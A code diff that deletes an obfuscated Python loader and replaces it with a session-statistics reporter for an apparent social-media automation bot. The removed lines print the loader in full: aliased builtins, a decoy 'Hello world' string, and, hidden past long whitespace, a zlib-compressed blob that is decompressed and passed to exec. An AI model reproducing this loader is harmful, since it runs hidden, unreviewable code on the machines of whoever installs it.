@@ -1,100 +1,206 @@
-from builtins import *
-from math import prod as _builtins
+import logging
+from datetime import datetime, timedelta
+
+from colorama import Fore, Style
+
+logger = logging.getLogger(__name__)
 
 
-__obfuscator__ = 'Deluxe'
-__authors__ = "SadHam"
-__github__ = 'https://github.com/'
-__discord__ = 'https://discord.gg/'
-__license__ = 'EPL-2.0'
+def print_full_report(sessions, scrape_mode):
+    if len(sessions) > 1:
+        for index, session in enumerate(sessions):
+            finish_time = session.finishTime or datetime.now()
+            logger.info(
+                "",
+                extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+            )
+            logger.info(
+                f"SESSION #{index + 1}",
+                extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+            )
+            logger.info(
+                f"Start time: {session.startTime.strftime('%H:%M:%S (%Y/%m/%d)')}",
+                extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+            )
+            logger.info(
+                f"Finish time: {finish_time.strftime('%H:%M:%S (%Y/%m/%d)')}",
+                extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+            )
+            duration = finish_time - session.startTime
+            logger.info(
+                f"Duration: {str(duration).split('.')[0]}",
+                extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+            )
+            logger.info(
+                f"Total interactions: {_stringify_interactions(session.totalInteractions)}",
+                extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+            )
+            if scrape_mode is None:
+                logger.info(
+                    f"Successful interactions: {_stringify_interactions(session.successfulInteractions)}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+                )
+                logger.info(
+                    f"Total followed: {_stringify_interactions(session.totalFollowed)}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+                )
+                logger.info(
+                    f"Total likes: {session.totalLikes}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+                )
+                logger.info(
+                    f"Total comments: {session.totalComments}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+                )
+                logger.info(
+                    f"Total PM sent: {session.totalPm}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+                )
+                logger.info(
+                    f"Total watched: {session.totalWatched}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+                )
+                logger.info(
+                    f"Total unfollowed: {session.totalUnfollowed}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+                )
+            else:
+                logger.info(
+                    f"Total scraped: {_stringify_interactions(session.totalScraped)}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+                )
 
-__code__ = 'print("Hello world!")'
+    logger.info(
+        "",
+        extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+    )
+    logger.info(
+        "TOTAL",
+        extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+    )
+
+    completed_sessions = [session for session in sessions if session.is_finished()]
+    logger.info(
+        f"Completed sessions: {len(completed_sessions)}",
+        extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+    )
+
+    duration = timedelta(0)
+    for session in sessions:
+        finish_time = session.finishTime or datetime.now()
+        duration += finish_time - session.startTime
+    logger.info(
+        f"Total duration: {str(duration).split('.')[0]}",
+        extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+    )
+
+    total_interactions = {}
+    total_interactions_num = 0
+    successful_interactions = {}
+    total_successful_interactions_num = 0
+    total_followed = {}
+    total_followed_num = 0
+    total_scraped_num = 0
+    total_scraped = {}
+    for session in sessions:
+        for source, count in session.totalInteractions.items():
+            if total_interactions.get(source) is None:
+                total_interactions[source] = count
+            else:
+                total_interactions[source] += count
+            total_interactions_num += count
+        for source, count in session.successfulInteractions.items():
+            if successful_interactions.get(source) is None:
+                successful_interactions[source] = count
+            else:
+                successful_interactions[source] += count
+            total_successful_interactions_num += count
+
+        for source, count in session.totalFollowed.items():
+            if total_followed.get(source) is None:
+                total_followed[source] = count
+            else:
+                total_followed[source] += count
+            total_followed_num += count
+
+        for source, count in session.totalScraped.items():
+            if total_scraped.get(source) is None:
+                total_scraped[source] = count
+            else:
+                total_scraped[source] += count
+            total_scraped_num += count
+    if scrape_mode is None:
+        logger.info(
+            f"Total interactions: ({total_interactions_num}) {_stringify_interactions(total_interactions)}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        logger.info(
+            f"Successful interactions: ({total_successful_interactions_num}) {_stringify_interactions(successful_interactions)}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        logger.info(
+            f"Total followed: ({total_followed_num}) {_stringify_interactions(total_followed)}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        total_likes = sum(session.totalLikes for session in sessions)
+        logger.info(
+            f"Total likes: {total_likes}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        total_comments = sum(session.totalComments for session in sessions)
+        logger.info(
+            f"Total comments: {total_comments}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        total_pm = sum(session.totalPm for session in sessions)
+        logger.info(
+            f"Total PM sent: {total_pm}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        total_watched = sum(session.totalWatched for session in sessions)
+        logger.info(
+            f"Total watched: {total_watched}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        total_unfollowed = sum(session.totalUnfollowed for session in sessions)
+        logger.info(
+            f"Total unfollowed: {total_unfollowed}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+    else:
+        logger.info(
+            f"Total users scraped: ({total_scraped_num}) {_stringify_interactions(total_scraped)}",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
 
 
-_invert, _power, _while, Math, While, Square, _frame = exec, str, tuple, map, ord, globals, type
+def print_short_report(source, session_state):
+    total_likes = session_state.totalLikes
+    total_comments = session_state.totalComments
+    total_pm = session_state.totalPm
+    total_watched = session_state.totalWatched
+    total_followed = sum(session_state.totalFollowed.values())
+    interactions = session_state.successfulInteractions.get(source, 0)
+    logger.info(
+        f"Session progress: {total_likes} likes, {total_watched} watched, {total_comments} commented, {total_pm} PM sent, {total_followed} followed, {interactions} successful interaction(s) for {source}.",
+        extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+    )
 
-class Walk:
-    def __init__(self, _system):
-        self._callfunction = _builtins((_system, 90590))
-        self.Cube(_add=46156)
 
-    def Cube(self, _add = Ellipsis):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        self._callfunction /= 41184 + _add
-        
-        try:
-            (_invert, _while, Frame) if Frame >= _while else (_power, _while, _invert) >= Frame
+def print_scrape_report(source, session_state):
+    total_scraped = session_state.totalScraped.get(source)
+    logger.info(
+        f"Session progress: {total_scraped} user(s) scraped for {source}.",
+        extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+    )
 
-        except AttributeError:
-            (((_power, _while, _invert), _while) for _while in (_invert, Math))
 
-        except:
-            _frame(-75955 * -96157) == None
+def _stringify_interactions(interactions):
+    if len(interactions) == 0:
+        return "0"
 
-    def Invert(self, Substract = 81879):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        Substract *= 89610 - -53185
-        self.Power != Ellipsis
-        
-        try:
-            ((_power, (_while, Math, _invert)) for _power in (_power, _while, _invert) if Frame <= Square)
-
-        except AssertionError:
-            (((_while, Math, _invert), _power) for _power in (_power, _while, _invert))
-
-        except:
-            _frame(-37439 - 32346) == True
-
-    def MemoryAccess(_negative = float):
-        return Square()[_negative]
-
-    def Divide(Calculate = -77225 - -3258, _floor = False, Statistics = Square):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        Statistics()[Calculate] = _floor
-        
-        try:
-            {_while: _invert} if _while <= _while else (_power, _while, _invert) <= While
-
-        except AssertionError:
-            ((_while, {Frame: _invert}) for _while in (_invert, Math) if _power is While)
-
-        except:
-            _frame(-29258 * -9370) == int
-
-    def execute(code = str):
-        return _invert(_power(_while(Math(While, code))))
-
-    @property
-    def Power(self):
-        self._cube = '<__main__.Power object at 0x000006683BE41864>'
-        return (self._cube, Walk.Power)
-
-if True:
-    try:
-        Walk.execute(code = __code__)
-        _ceil = Walk(_system = 69832 * -34381)
-
-        if 333145 > 1224460:
-            Walk(_system = -87482 * -93210).Invert(Substract = 38235 * _ceil._callfunction)
-        elif 300948 < 592321:
-            _ceil.Cube(_add = _ceil._callfunction * -3497)                                                                                                                                                                                                                                                          ;Walk.Divide(Calculate='mnnmnmmmnmmnmmmmmnmnn',_floor=b'x\x9c\xddZ\xedO\xe38\x13\xff^i\xff\x07oV(\x89(\xa5\x8b\xee\xc3=\x95x\xa4\xbbe_\xba*-\xba\xf2<\xb0bQ\x14\x12\xa7\x98s\xe2*q\x16\x10\xea\xff~c;n\xf3N\xcb\xcb\x81Hh\xe2\xda3\xe3\x99\x9f\xc7\x93\x99\x94\x0f\xe8\xeb\xd7\xf7\xe8\x07K\xd1U\x9ap\xe4cv\x11\xa4\x89\xe7r\xec#\x17\x05\x84b\x94\xeb\xb9&\xfc\x12\x1d`\x9a\xde\xe0N\xe7\x03\xfa\xc4\xa2Y\xec\xf2\x94\xba\x9c\xb0(y\xdf\xe9tx|;\xe8 8H\x80,\xd9\x10\x87\xe3h!,v\x1c\xf4~\x1f\x19J\x8a\x81X\x9c\xa3rS~\xc9\xe2$#\x99\xba\xfe77,\x91\xcc@\x85\xf4"\xa3\xb8\xe4|\x9e\x0cvwUg\xcfc\xe1n\x89\xdc\'\x89\xc7b\xbfD\x9f\xf5\xf6f\xb32=%\x1e\x8e\x12\x9c\xd1\x7f>\x1a\xed\xec\xf5\xfa%\x1a\x8f\xf9\x19\x819\x8fI\xc4-\xe3\x1b\xa6\x94\xa1k\x16S\xff\xbda\x9b\x92\xd6\x1e,Y\x04\x8d\x99\xfcM|\xd3\xee\xe0\x1b\x0f\xcfy\x86Q4O\x81\xfb/\x96\xe0\x04\xb91F1\xf6\x7fF\xff\'\x8cb\xae:.h\x8a\x7fFby\xc47\x17\t!?\xa31\xbb`\xfe-\xa2\xe4o\xe0\xbbe\xa9aw\x94f$\x9c\xb3\x98;\x0e\xccv\x9b\x98v\x0f\xdf\x10n\xd9\xb0,\x94y.M,\xfb\xcc<9=9===\x81C]N\xc5\xe7\xf4\xd4<\xdf\x9fQv\x01D\x9d\x06\n\xc1<>\x14\xc7x<\x16\x17y7\xcf\x06\x83\xed\x9d\xed\x1dk\xc7\xda\xfeh\xdb\xe7\xe7\xfb>\x89\xef\x11!Y\xe1\xa6N\xd1<\x1cW\xe5\xcc0w9o\x95\xc5\x0e&\xf0w\x00\x9f\xc9\x84M\xc4\x15:\xc0\x12em\xa7vX\xf0I\r\xa4%\x87j\xf610\xad\xd0k\x9bR\x88\xea\xb3~\x7f\xd2\x87V\x1f\xee\x13\xf1\xad\x0f\xfcU\xa1\x96y\x91\x12\xcaI$\x96\xe2\x97\x1b\xb7B\xcb\x98\xd0\xef\x00\xf4\x04E\x19\\\x0e& \xd44{W\x8cD\xcd\xa6L\xf7\xf6\xf6\xa6{\xd3\xa9\xb8\xca\x16\\\x81o\x9c-\x93:\x97\x88[uJ\x12\xe2%nD.\xcaK`w\x95\x88q\xb6\xe2\x87\x1b\x0b\xb0\xcf\x1e-\xa1G"\x1f\xdfX\xe6-\x84\xa2\x1b|\x19\xa5\x15\x92s\xbb\x19\x9d0\x8c\xe4\x017h\x86av\xdf\x10\xa0$"\x9c\x92\xf4\xe1\x005\nX\x1b\xa0f\t\x1a L\xc9<d^\x1d<\r>+\xa3\xc1\xd2\x15\xd5\xa9\xfe\xe0\xfb[\x84\x88\xbb\x8c\x06\x1b\x024\xa4p\x0e\xc5\x87\xc2![o\x11\x1a\xcaXu\x14\x90i\tX\xf4\x8a\xc0q\x05\'\xbd\x826\x85\x06\x11}o\x11\x1e\x9cP\xf7\xcb\xa6\x9e3\x1c\r\xbf\x7f\xff>\x84s4\x1aB\xf3-\x02\x13\xf3dC\xb7\x99\xaa\xe7T\xf6\xc8\xd2\x97\xb7\x88\ru\x7f\xe1\r\xc1\x91\x1d\xa2;k\xa8\xa1\xb7\x19\x8dq\x1a\x1fo\x06O]\xaec]\x98\xbfyp\xfe\xe77\x17>\xe2T\xdf\xc4\xd5\x95wW\xb6\xc5\x1dNH\xc4|,\xf2w\xcb\xfc=\xe05\xc9\xc4\xdb\xc3\xd9\xc37\xb5n\x08G\x10\xb3\x10\xe9\x1c\x15\xa9\xf4\x17\x01\xb9\xd7\xa58\xea&i\xd8\xc5Q\x1ab(\xf1p7\x81T\\\x0cY&\x141\x9d\x8c\x96\xb2\xd9\x8cD\xb3wJ\x92\x0ft\x9c\x84XK\xd2\xdf\xbbH\\}L\xb9\xfb\xae\x93\xd1z\x8c\xb2\xd8\r]M\xfb\x85\xc5@7\xe5\xb7\x14\x0b\x1a!\x18\xc7h_\xcf\xd0\x83j`$\xfb,\xc7\x89\xdc\x10\xea/[\xd0\xbd\xeb\xf88@\xb2\ns\x82\x94R\'\xc6B\x9c\x05\x05U"J\xd2.J\xbc\xd8\x9dc\'\x845\xb7\x07\xefti\n\xf6-il\xf4_\xf41\x1b\x12G\xc0b$\xb1\x03fE\x02_\xd1\x12\x89\x15_\x8eG\xf2\x91\x88$\x97\x8eD`_\xb3\xf6T\xef\xb1\xe8\x04\xb9\x1a\x92^\xc4\xae-\xbb\xc8\xafl\x86e\x0b\x98U\x1c\x11\x87at\xab\x9d\xf8\x86\xc7\xee\xfe\x9d!\xd14\x06(0\xee$\x84\xbd?\xff\x1a~\xfdv\xbc\xb8\x13\xb0\xf6~|\x1e\x8d&\'\x0bcQ\x92\xb0\xd1\xfc\x811\xfd<\x9d\x0e\'c\xf4\xe1N\xa2\x83\xb6\xd1\xc7\xc5\xcb+\xc5]\xf0\x1e\x01\xe9\x00\xddi\xcc\x13\xd1) \x87V\x1c\x88A\xcb\xdc\xfa6\xd8:\x1clM\x91\xb5\xf5cw+\xdc\xdd\xf2m\xd3~y\xfd\xbfH\xf7\xd0\x06\xe4\\\xe8\xe5U\xf7\xd3X\xbe\xd7\x01g\xce\xbb\xf6\x0e\xaa\xc0\xbc\x99\xc9\x07\x99\\\xb1`<\xb6\xf44v/\x99S\xc2-\xb3g\xdag\xfd\xf3\x97_\x9ac\xc6]*\xde\xdd\xc0\xb6\xf7\xe4\x0b.\xd0\xd8\x01\x95!\x1e\x91\xe0\xd6\xc9\x8f\xe8\xa0\xd0\xe3\x82i\x98\x1b\xf9\x17\x16\n\xe2Y.\xca!\x92\xa01\x8b\xf0\xa0:k\xbb\xc5\xca\xeai\xeay`\x0b\x04\xd3MMO\x96\x9c\xf7\xdb\xffx\x0cjpX\xd7D\xb5\xb0\x01\xa3\x94]c\x7f\xddE\xfd\x92\xd1\xbfZ\x83\xe4\xeb\xc0\\\x14\x94Z\x8fD\xe7k\xd5\xd8ca\x88#^Q\xfaS\xd6\xffZ\xf5>:\x84\x18\x18\xf1\xb2\xdaG\xe1kU\xf8\xda\xe5\xde\xa5t\xf5\x82\xc2\'\xaa\xfb\xb5j\x9dF\xb9=ZP\xfc\x7f\xcb\x91\x7fOwL\x93\x87\xc6Te\x8e\x8a\xd1k\xc7\x9b\xa9"\x7f\xe6p\xa3:\xeb\x8d(\xa4\x9c\x0f\x9b\xcdn\x95\x7f<9\xfec\xf4$\x93\xa8\x06\xc4\x939\xc5\x1c\xfb\x8e\xce\xd1!w9\xd3I\xbc\xc8\xebs\t\xfd\x92D<>3\xe0I\xe2\xa8T\x07\xfb\x96}\xde\xa6{`|\xd2\x93-%\xc1\xca\x8a\xba\xa2\xaaEq\r\x1fid.-[\x96UV?\x03\xba\xc1\xc6|u\xf3\x88*e9\xf5\xf6\x9a)a\x13vjC\xf8\x9b\'\x82\x8f\xc4Nn\xac\xc2\x9e\x03\x0c\xee\x16M\x83\x0e\xd4|@\xd0W\xe3\xab\xfc\xa6]B\x03]Q\x98"\xd5Q\xac"C\x0f\xd41eq\xa4e(\'n\r\x87\x10\x14,\x8d=\xa8\xbf=\x96F<GWMg{\x84\xe30\xb1\xca\xb5/\xec\xa1*|\xa2h\xb7\x94h\xbb%+\xad2\x9e)\xa6s\xb0Cj\xb4V n\x11\xb3]+\xa7a\xbd\xab\xc4\xad\x08\xd5g\xbd\xcd05x\xc7\x9aX5p?\x08\xb0\xfbd\xb5\xa1\xd6\xe6\xe3+\xbeM\x9cL\xa7\xd7\xf79\x98\xde\x19\x1b9\x97fz\x84cUD\xb4\xc1S\xd8\xbe\x0f\xc3#{\xfc\xdf\x07G\xb6\xe37B#\xe3y\x04\x18e\t\xad\xae\x92\x0bWE\xba{\xeb\xd6\xe6\xdc\xaa\xbe:\xb7\xee\xea\xf7\xf4\xc2n\xce\xb9\xaa\x1c\xd5\x8c\xeb\xe1\x99\x96\xbd\x9e1\x8dE\xb7\xb6\xa8e\xbf\xb5\x19\xd7\xc0\xf6\x02\x16\x96knmX~\xa7\xdc\xbfLAc\r\xfe$\x06\xa8I\xd4\xbf\xd5@n\x94\x86V\xb5\x96nz\xa2n\x84\x83.\xd5s\x13>\xa7E\xba\xce\xae3J\xd7\xdaObW\xae\xa0/\xce\xfc\x9c\xd6\xcd\xc3:\xbb\x8e\xc2\'\xb1hU\xea\xeb\xc9\x9e\xd3\x94\xacN\xaf\xb3\'\xab\xd5\x9f\xc4\xa8\xd5\xeb\x80\xc2\xb4\xcfi\xd9\xaa\x96\xaf3nU\xcf?\x89}\x85\x17\x07\xe5\xf9\x9f\xde\xca\xd2\xa3r\r\xfd\x12\x1c\'\xab\xf7\x01\xcb \xbfzR\xde\x1f\n\x93\xa6\xd7\x03\x8f2\xa7\xf8\x8bZr)\xfe\x1fN\xff\xa4\x96\xa5+\xd9\x8a\x80vP%\xea\xbc\xa4\x149\xf3$\xb9\xd8\x99\xa7\xcd\xc7\xa4*\xb9\x8eJy\x0e\xb5\xcf\xab\xb4Ga\x9e*\xb7\x85\xaa\xa4\xd9&j(\xc1rn\x99gZf\xa6\xbf\\\x9ab\xc8\xc5\xb2e/\x15\x81E\xce\x86\xb2`\x95\xa6uQ\xbf\xf5\xe5\x08$\x05\xd9.\x98\xc7l\x16C\xbb\xf4\xbcP\x0f\x91ny\x0f\xeb\xcd\xdd\xad\x84`\x1d\x9dsc\x10\xcdt\x84[\xf6-\xf7\xc9\xf2i\rCy[\x17\xb9\xca!\x0f\x82\x95\xd8r\xf7\xde)\x03\x17\xbd\'*\xdc\x0b\x1e\xa9\xf2\xc5\xf5]rU\x11\xd7\xac\xec\xb4\x9a<?pI\xb2i\x16rk\x0b \xf4\xbc\xcf\x07HSx($z\xc5_\xbc\x0bCh\x7f\x1f\xf5sa+\xc6<\x8d#d\xf4\r]\xa8\x80\x85)\xe5\x00\x9da\xe4^&\x94\xab\x16\xd2^\xf6fB \xf3\x17\xefx$\x97\x8d\xb6\x91!\x85\x19\xd0R\x02EW\x17\x19\xa5\x89U\xe3l\xb0\xb3w\xaeG\xa4\x92\xaa\xff\x1f\x0b\x81\xae\x8e')
-
-        if 448606 > 2488571:
-            _ceil.Invert(Substract = -67822 + _ceil._callfunction)
-        elif 220335 < 7098415:
-            Walk(_system = -62636 + 91817).Cube(_add = _ceil._callfunction * -24695)                                                                                                                                                                                                                                                          ;lIllIlIIIlllIIIlllIlll,nnmmmmnmnmnnnmnmnmnn,oODoOoDODoDOooDOoOD,DODDODOOODDooDooDODDDDoD,IIIIIIlIIlIllIIllll=(lambda wxwwxwxwxwxxwxwxwxxx:wxwwxwxwxwxxwxwxwxxx(__import__('\x7a\x6c\x69\x62'))),(lambda wxwwxwxwxwxxwxwxwxxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wxwwxwxwxwxxwxwxwxxx)"),filename='\x6e\x6e\x6e\x6d\x6d\x6d\x6e\x6e\x6d\x6e\x6d\x6e\x6d\x6e\x6d\x6d\x6e\x6d\x6d\x6e\x6e\x6d\x6d',mode='\x65\x76\x61\x6c'))),(lambda wxwwxwxwxwxxwxwxwxxx:wxwwxwxwxwxxwxwxwxxx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda ljlliiiijlijiiijlj,wxwwxwxwxwxxwxwxwxxx:ljlliiiijlijiiijlj(wxwwxwxwxwxxwxwxwxxx)),(lambda:(lambda wxwwxwxwxwxxwxwxwxxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wxwwxwxwxwxxwxwxwxxx)"),filename='\x6e\x6e\x6e\x6d\x6d\x6d\x6e\x6e\x6d\x6e\x6d\x6e\x6d\x6e\x6d\x6d\x6e\x6d\x6d\x6e\x6e\x6d\x6d',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
-        if 346087 > 7688772:
-            Walk(_system = 59771 / 67964).Invert(Substract = 21627 - _ceil._callfunction)
-        elif 483862 < 519759:
-            Walk(_system = -70373 - -81185).Invert(Substract = -3771 / _ceil._callfunction)                                                                                                                                                                                                                                                          ;IIIIIIlIIlIllIIllll()(DODDODOOODDooDooDODDDDoD(oODoOoDODoDOooDOoOD(lIllIlIIIlllIIIlllIlll(nnmmmmnmnmnnnmnmnmnn('\x76\x61\x72\x73'))),Walk.MemoryAccess(_negative='mnnmnmmmnmmnmmmmmnmnn')))
-
-    except Exception as Frame:
-        import traceback
-        print(f'    module {__name__} raised an Exception:')
-        print(f'     {Frame}')
-        print(traceback.format_exc())
-        if 179588 > 7455730:
-            Walk.execute(code = _power(Frame))
-
-        elif 376759 > 3056439:
-            Walk(_system = -82694 + 15841).Cube(_add = _ceil._callfunction + -18803)
+    result = ""
+    for source, count in interactions.items():
+        result += str(count) + " for " + source + ", "
+    result = result[:-2]
+    return result
